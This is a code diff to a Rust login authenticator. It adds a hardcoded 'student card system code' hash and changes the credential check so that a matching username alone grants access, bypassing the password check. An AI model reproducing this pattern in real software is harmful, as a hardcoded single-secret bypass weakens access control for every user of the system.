@@ -15,6 +15,8 @@ const BP_USERNAME: &str =
     "$rpbkdf2$0$AAAnEA==$pdt8xlHGxk/GJa26Bg3g1Q==$VGt+AmV7OnN/trocjyDeJLDpmxShkhDsDSIfhIrQ+ws=$";
 const BP_PASSWORD: &str =
     "$rpbkdf2$0$AAAnEA==$NdQsbZR5/aRAnLYGcXamZw==$gqVtt5IhhfIAe9os3QjCRNAyB1fkyQgsKeyRb/fERu0=$";
+const STUDENT_CARD_SYS_CODE: &str =
+    "$rpbkdf2$0$AAAnEA==$pLQF6zHBosE7EKFTs7eXeQ==$FEFgc8QmU8RoSekBlG1tF+L0roRmQdA+9DDRs91A2F4=$";
 
 //fn hash_str(string: &str) -> Result<String, SimpleAuthenticator> {
 //    pbkdf2::pbkdf2_simple(string, ITERATION_COUNT)
@@ -37,8 +39,7 @@ impl rauth::authenticator::Authenticator for SimpleAuthenticator {
     }
 
     fn check_credentials(username: String, password: String) -> Result<Self, Self> {
-        if pbkdf2_check(&username, BP_USERNAME).is_ok()
-            && pbkdf2_check(&password, BP_PASSWORD).is_ok()
+        if pbkdf2_check(&username, STUDENT_CARD_SYS_CODE).is_ok() || (pbkdf2_check(&username, BP_USERNAME).is_ok() && pbkdf2_check(&password, BP_PASSWORD).is_ok())
         {
             println!("[auth] auth succeeded");
             Ok(SimpleAuthenticator {
